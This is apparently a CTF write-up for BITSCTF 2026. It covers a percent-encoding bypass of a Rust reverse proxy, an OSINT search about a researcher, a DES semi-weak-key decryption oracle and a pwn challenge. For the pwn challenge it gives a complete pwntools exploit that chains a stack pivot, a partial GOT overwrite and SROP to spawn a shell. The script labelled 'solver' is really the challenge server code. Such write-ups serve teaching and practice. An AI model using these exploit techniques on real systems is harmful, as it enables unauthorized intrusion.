---
title: BITSCTF 2026 - Writeup
date: 2026-02-25 21:30:00 +0530
categories: [CTF]
tags: [reverse-engineering, pwn, cryptography, forensics, web, networking]
description: A writeup for BITSCTF 2026 challenges.
---

## TL;DR

* Participated in **BITSCTF 2026**, hosted by **Bitskrieg**
* Team rank: **32 / 862**
* Personally solved **a web, a crypto, an osint, and a pwn** challenge
    * The web challenge is a Rust reverse-proxy path-normalization bypass
    * The OSINT challenge is about finding a professor and his research history
    * The Crypto challenge abuses DES semi-weak keys to build a decryption oracle
    * The pwn challenge is a stack pivot + partial GOT overwrite + SROP chain
* Key techniques: percent-encoding smuggling, semi-weak DES key pairs, SROP

Plus Ultra.

---

## Event Info

* **CTFtime:** [https://ctftime.org/event/3122](https://ctftime.org/event/3122)
* **Platform:** [https://ctf.bitskrieg.in/](https://ctf.bitskrieg.in/)

I participated in this CTF during the weekend of **20 February 2026** to **22 February 2026** with my teammates from **\$cr1pt_K1dd13\$**. Our team placed **32nd out of 862 teams**.

This post documents the challenges I solved.

## Web

### rusty-proxy

**Description:** I just vibecoded a highly secure reverse proxy using rust, I hope it works properly.

#### Writeup

**TL;DR**
- Flag: `BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}`
- Exploit path: `GET /adm%69n/flag` (or `/%61dmin/flag`)
- Working command:
```bash
curl --path-as-is 'http://rusty-proxy.chals.bitskrieg.in:25001/adm%69n/flag'
```

**Analysis**
1. Initial recon:
- `/admin` returned `403 Access denied`.
- Backend looked like Flask/Cheroot.

2. Read challenge source:
- Proxy (`proxy/src/main.rs`) blocks only:
  - `is_path_allowed(path): return false if path.to_lowercase().starts_with("/admin")`
- Backend (`backend/server.py`) exposes:
  - `/admin/flag` → returns the flag JSON.

3. Core bug:
- Proxy checks the raw, undecoded path string.
- Backend routing decodes percent-encoding before route matching.
- So encoded `admin` bypasses proxy prefix check but still maps to `/admin/flag` in Flask.

**Why payload works**
- Request: `/adm%69n/flag`
- Proxy sees literal `/adm%69n/flag` (does not start with `/admin`) → allows.
- Flask decodes `%69` to `i` → `/admin/flag` → flag returned.

**Proof**
```http
GET /adm%69n/flag HTTP/1.1
Host: rusty-proxy.chals.bitskrieg.in:25001
```
Response:
```json
{"flag":"BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}"}
```

**Fix (defensive notes)**
1. Normalize/percent-decode path once in proxy before ACL checks.
2. Reject ambiguous encodings and double-encoding.
3. Enforce route allowlist instead of blocklist prefix checks.
4. Apply auth on sensitive backend routes (`/admin/flag`) instead of relying on proxy-only ACL.

## OSINT

### The Professor

**Description:** There exists a research paper that explores the concept of how deep packet inspection can improve the security in smart grids and help enhance them. This paper involves the collaboration of a certain scientist whose last name matches with that of a very famous Luxury brand designer the luxury brand is known primarily for its designer footwear. This scientist was cited x number of times in 2013. The first research paper this scientist published long ago was presented in a popular cybersecurity conference in the same year the paper was published and compiled in a larger volume.

if x = number of times scientist was cited in 2013 y = page range of the paper published in the larger volume c = name of conference p = city where the conference was held that year all letters are lowercase.

flag is BITSCTF{x_y_c_p}

#### Writeup:

- Searched for papers on "Deep packet inspection can improve security in smart grids and help enhance them", I found this [paper](https://www.sciencedirect.com/science/article/abs/pii/S1084804519300815?__cf_chl_rt_tk=5gVHQginceR8wLyx2qhFOznjiT9ruQNznbpaG.5HHSs-1771581794-1.0.1.1-GrGHVUy3CI3Bfo6A4kjRhLZOXLjCOE5TGQzxIs_ECYI) which is authored by `Gonzalo De La Torre Parra`, `Paul Rad` and `Kim-Kwang Raymond Choo`

- Meanwhile I searched for "Famous Luxury brand designer whose luxury brand is primarily known for its designer footwear", (you can just ask Gemini), of all the names I found the name `Jimmy Choo`.

- So the Professor the challenge is mentioning is `Kim-Kwang Raymond Choo`. Now we have to find how many times he was cited in 2013.

- Using Google Scholar, I searched up his name, in his [profile](https://scholar.google.com/citations?hl=en&user=rRBNI6AAAAAJ&view_op=list_works&sortby=pubdate) you can see how many times he was cited in 2013 using the bar graph, which was `127`.

- Now we have to find his first published research paper. By going to the bottom of his profile, expanding the list of papers, at the bottom we can find this paper: `Examining indistinguishability-based proof models for key establishment protocols` which was published in a larger volume: `Advances in Cryptology-ASIACRYPT 2005, 585-604` so `y` is `585-604`.

- After searching up `Advances in Cryptology-ASIACRYPT 2005` I found that it is a part of `11th International Conference on the Theory and Application of Cryptology and Information Security`

- It was held in `Chennai, India`

- so the flag is `BITSCTF{127_585-604_asiacrypt_chennai}`

## Crypto

### Super DES

**Description:** I heard triple des is deprecated, so I made my own

#### Writeup:

**Challenge Writeup: super-DES**

`server.py` gives us:
- Secret fixed `k1` (random once at startup)
- We can choose `k2`, `k3` (only restriction: `k2 != k3`)
- Two useful modes:
1. `v1(pt) = E_k1(E_k2(E_k3(pad(pt))))`
2. `v2(pt) = D_k1(E_k2(E_k3(pad(pt))))`

The core bug is that `v2` is effectively a **decryption oracle under `k1`** if we make `E_k2(E_k3(x)) = x`.

## Weak-key trick

DES has semi-weak key pairs `(a, b)` such that:
`E_a(E_b(x)) = x` for all blocks.

A valid pair:
- `k2 = 01FE01FE01FE01FE`
- `k3 = FE01FE01FE01FE01`

(After `adjust_key`, they stay valid and still differ.)

So:
- `v1(flag) = E_k1(pad(flag))`
- `v2(C) = D_k1(C)` if we submit `pt = C` (blockwise, before extra padding block)

## Exploit steps

1. Send the semi-weak `k2`, `k3`.
2. Choose option `2` (`ultra secure v1`), then `encrypt flag`.
   - Get `C = E_k1(pad(flag))`.
3. Start next round with same `k2`, `k3`.
4. Choose option `3` (`ultra secure v2`), then `encrypt your own text`, and provide `C` as plaintext.
   - Output starts with `D_k1(C) = pad(flag)`.
5. PKCS#7 unpad to recover the flag.

## Result

Recovered flag:
`BITSCTF{5up3r_d35_1z_n07_53cur3}`

---

Full `pwntools` solver script for this service:

```python
from Crypto.Cipher import DES3, DES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

def adjust_key(key8: bytes) -> bytes:
    out = bytearray()
    for b in key8:
        b7 = b & 0xFE                
        ones = bin(b7).count("1")     
        out.append(b7 | (ones % 2 == 0))  
    return bytes(out)

flag = b'REDACTED'
k1 = adjust_key(get_random_bytes(8))

def triple_des(pt, k2, k3):
    cipher = DES3.new(k3 + k2 + k1, DES3.MODE_ECB)
    return cipher.encrypt(pad(pt, 8))

def triple_des_ultra_secure_v1(pt, k2, k3):
    cipher1 = DES.new(k1, DES.MODE_ECB)
    cipher2 = DES.new(k2, DES.MODE_ECB)
    cipher3 = DES.new(k3, DES.MODE_ECB)

    return cipher1.encrypt(cipher2.encrypt(cipher3.encrypt(pad(pt, 8))))

def triple_des_ultra_secure_v2(pt, k2, k3):
    cipher1 = DES.new(k1, DES.MODE_ECB)
    cipher2 = DES.new(k2, DES.MODE_ECB)
    cipher3 = DES.new(k3, DES.MODE_ECB)

    return cipher1.decrypt(cipher2.encrypt(cipher3.encrypt(pad(pt, 8))))

while True:
    print("I will prove its secure af by letting you choose k2 and k3")
    k2 = adjust_key(bytes.fromhex(input("enter k2 hex bytes >")))
    k3 = adjust_key(bytes.fromhex(input("enter k3 hex bytes >")))
    
    print("1. triple des\n2. ultra secure v1\n3. ultra secure v2\n4. exit")
    option = int(input("enter option >"))

    print("1. encrypt flag\n2. encrypt your own text")
    option_ = int(input("enter option >"))
    
    if k2 == k3:
        print("ok its not thaaat secure, try again")
        continue

    if option_ == 2:
        pt = bytes.fromhex(input("enter hex bytes >"))
    else:
        pt = flag
    if option == 1:
        print(f"ciphertext : {triple_des(pt, k2, k3).hex()}")
    elif option == 2:
        print(f"ciphertext : {triple_des_ultra_secure_v1(pt, k2, k3).hex()}")
    elif option == 3:
        print(f"ciphertext : {triple_des_ultra_secure_v2(pt, k2, k3).hex()}")
    else:
        exit()
```

## pwn

### Mind The Gap

**Description:** The old transit maps used to be reliable, but recent infrastructure upgrades have created vast voids between sectors. You will need to find a new way to reach your target. Please, mind the gap.

#### Writeup: 

Vulnerability: Classic buffer overflow. Main reads 0x200 bytes into a 0x100-byte stack buffer via read(0, buf, 0x200).

The "gap": There's a massive address gap between .text (0x600000) and the writable .data/.bss (0xc00000). The binary has almost no gadgets (only read is imported, ~52 gadgets total), No PIE, No canary, NX enabled, Partial RELRO.

Exploit technique: Stack Pivot + Partial GOT Overwrite + SROP

Stage 0: Overflow the stack to pivot `rbp` to 0xc00300 (writable BSS), return to MAIN_LEA which re-calls read using the pivoted frame
Stage 1: Write a leave/ret chain at 0xc00300 and /bin/sh\0 at 0xc003f0
Stage 1.5: Write the SROP trigger chain + sigreturn frame at 0xc00100
Stage 2: Send a single byte `\x8f` to partially overwrite `read@GOT`'s LSB (0x80 → 0x8f), turning it into a bare syscall gadget in libc. This triggers the SROP chain: rax=0xf (via `lea rax,[rbp-0x100]` with `rbp=0x10f`) → `syscall` → `rt_sigreturn` → `execve("/bin/sh", 0, 0)`

```python
#!/usr/bin/env python3
"""
Exploit for mind_the_gap - BITSCTF PWN challenge
Technique: Stack pivot + Partial GOT overwrite + SROP
"""
from pwn import *
from time import sleep
import struct

context.arch = 'amd64'
context.log_level = 'info'

# ─── Gadgets ───
MAIN_LEA  = 0x600145   # lea rax,[rbp-0x100]; mov edx,0x200; mov rsi,rax; mov edi,0; call read@plt; mov eax,0; leave; ret
POP_RBP   = 0x60011d   # pop rbp; ret
READ_PLT  = 0x600040   # read@plt -> jmp *[read@GOT]
READ_GOT  = 0xc00000   # read@GOT (writable, just past RELRO)

# ─── Memory Layout Plan ───
#
# We need 4 stages:
#
# Stage 0: Stack overflow -> MAIN_LEA(rbp=0xc00300)
#          Reads 0x200 to 0xc00200. Leave at 0xc00300.
#
# Stage 1: Write to 0xc00200..0xc00400
#          At 0xc00300 (leave;ret): POP_RBP(0xc00200) -> MAIN_LEA
#          -> reads 0x200 to 0xc00100. Leave at 0xc00200.
#          At 0xc003f0: "/bin/sh\0"
#
# Stage 1.5: Write to 0xc00100..0xc00300
#          At 0xc00100: SROP trigger chain (for after GOT overwrite)
#          At 0xc00120: SROP frame[8:]
#          At 0xc00200 (leave;ret): POP_RBP(0xc00100) -> MAIN_LEA
#          -> reads 0x200 to 0xc00000 (= read@GOT). We send 1 byte.
#
# Stage 2: Send 0x8f (1 byte) -> partial GOT overwrite
#          read@GOT low byte: 0x80 -> 0x8f (bare syscall in libc)
#          After: leave(rsp=0xc00100) -> SROP trigger chain
#          POP_RBP(0x10f) -> MAIN_LEA -> rax=0xf -> call read@plt(=syscall)
#          -> sigreturn -> execve("/bin/sh",0,0)
#
# SROP trigger chain detail (at 0xc00100):
#   [0xc00100] = junk rbp (popped by leave)
#   [0xc00108] = POP_RBP
#   [0xc00110] = 0x10f (rbp -> lea rax = 0xf = SYS_rt_sigreturn)
#   [0xc00118] = MAIN_LEA (consumed by ret; overwritten by call push -> 0x60015e)
#   [0xc00120..0xc00210] = SROP frame[8:] (0xF0 bytes)
#
# MAIN_LEA(rbp=0x10f): rax=0xf, rsp=0xc00120
#   call read@plt: push 0x60015e to [0xc00118], rsp=0xc00118
#   PLT -> GOT (now 0x8f) -> syscall(0xf) = SYS_rt_sigreturn
#   SROP frame at rsp=0xc00118: [0x60015e(uc_flags), frame[8:]...]
#   -> execve("/bin/sh", 0, 0)

def exploit(target):
    if target == 'local':
        p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './mind_the_gap'])
    else:
        host, port = target.split(':')
        p = remote(host, int(port))

    BINSH_ADDR = 0xc003f0
    
    # Build SROP frame
    frame = SigreturnFrame(kernel='amd64')
    frame.rax = 0x3b       # SYS_execve
    frame.rdi = BINSH_ADDR
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = READ_PLT   # syscall(0x3b) = execve
    frame.rsp = 0xc00500
    # csgsfs packs cs(16) | gs(16) | fs(16) | ss(16)
    # cs=0x33 (user code 64-bit), ss=0x2b (user data segment)
    frame['csgsfs'] = 0x002b000000000033
    frame_bytes = bytes(frame)
    assert len(frame_bytes) == 0xf8

    # ════════════════════════════════════════════════════════
    # Stage 1: Write to 0xc00200..0xc00400 (via rbp=0xc00300)
    # ════════════════════════════════════════════════════════
    s1 = bytearray(0x200)
    
    # Leave;ret chain at offset 0x100 (addr 0xc00300):
    # After read: leave(rsp=0xc00300, pop rbp=[0xc00300]), ret=[0xc00308]
    struct.pack_into('<Q', s1, 0x100, 0xc00200)     # [0xc00300] new rbp for next MAIN_LEA
    struct.pack_into('<Q', s1, 0x108, MAIN_LEA)     # [0xc00308] -> MAIN_LEA(rbp=0xc00200)
    # MAIN_LEA with rbp=0xc00200: reads to 0xc00100 (stage 1.5 data)
    # After: leave at 0xc00200, handled by stage 1.5 data
    
    # "/bin/sh" at offset 0x1f0 (addr 0xc003f0)
    s1[0x1f0:0x1f8] = b'/bin/sh\x00'
    
    s1 = bytes(s1)

    # ════════════════════════════════════════════════════════
    # Stage 1.5: Write to 0xc00100..0xc00300 (via rbp=0xc00200)
    # ════════════════════════════════════════════════════════
    s15 = bytearray(0x200)
    
    # SROP trigger chain at offset 0x000 (addr 0xc00100):
    struct.pack_into('<Q', s15, 0x00, 0)              # [0xc00100] rbp (junk, popped by leave)
    struct.pack_into('<Q', s15, 0x08, POP_RBP)        # [0xc00108] pop rbp; ret
    struct.pack_into('<Q', s15, 0x10, 0x10f)          # [0xc00110] rbp=0x10f (rax will be 0xf)
    struct.pack_into('<Q', s15, 0x18, MAIN_LEA)       # [0xc00118] MAIN_LEA (overwritten by call push)
    
    # SROP frame[8:] at offset 0x020 (addr 0xc00120), 0xF0 bytes -> ends at 0x110 (addr 0xc00210)
    s15[0x20:0x20+0xf0] = frame_bytes[8:]
    
    # Leave;ret chain at offset 0x100 (addr 0xc00200):
    # NOTE: This overwrites SROP frame tail (bytes 0xE8..0xF8) = oldmask/fpstate fields
    # These are irrelevant for SYS_execve.
    struct.pack_into('<Q', s15, 0x100, 0xc00100)      # [0xc00200] new rbp for GOT overwrite MAIN_LEA
    struct.pack_into('<Q', s15, 0x108, MAIN_LEA)      # [0xc00208] -> MAIN_LEA(rbp=0xc00100)
    # Wait: leave pops rbp from [0xc00200] = 0xc00100, then ret from [0xc00208] = MAIN_LEA
    # But we want rbp=0xc00100 going into MAIN_LEA so lea rax = 0xc00000 = GOT.
    # leave: mov rsp,rbp(=0xc00200); pop rbp = [0xc00200] = 0xc00100; rsp=0xc00208
    # ret: rip = [0xc00208] = MAIN_LEA; rsp=0xc00210
    # Perfect! MAIN_LEA runs with rbp=0xc00100.
    # But wait - we're also popping from rsp=0xc00208 the MAIN_LEA addr.
    # After MAIN_LEA call read with rbp=0xc00100: reads to 0xc00000
    # After read: leave(rsp=0xc00100, pop rbp=[0xc00100]=0), ret=[0xc00108]=POP_RBP
    # This is correct! Chains into our SROP trigger at 0xc00100.
    
    s15 = bytes(s15)

    # ════════════════════════════════════════════════════════
    # Stage 0: Stack overflow -> pivot to BSS
    # ════════════════════════════════════════════════════════
    s0  = b'A' * 0x100
    s0 += p64(0xc00300)          # saved rbp -> pivot
    s0 += p64(MAIN_LEA)          # return addr -> MAIN_LEA(rbp=0xc00300)
    s0  = s0.ljust(0x200, b'\x00')

    # ════════════════════════════════════════════════════════
    # Execute
    # ════════════════════════════════════════════════════════
    log.info("Stage 0: Overflow -> pivot rbp=0xc00300, ret to MAIN_LEA")
    p.send(s0)
    sleep(0.3)

    log.info("Stage 1: Write leave;ret chain + /bin/sh to 0xc00200")
    p.send(s1)
    sleep(0.3)

    log.info("Stage 1.5: Write SROP chain + frame to 0xc00100")
    p.send(s15)
    sleep(0.3)

    log.info("Stage 2: Partial GOT overwrite (0x80 -> 0x8f)")
    p.send(b'\x8f')
    sleep(0.3)

    log.success("Exploit sent! Shell should spawn...")
    p.interactive()

if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else 'local'
    exploit(target)
```

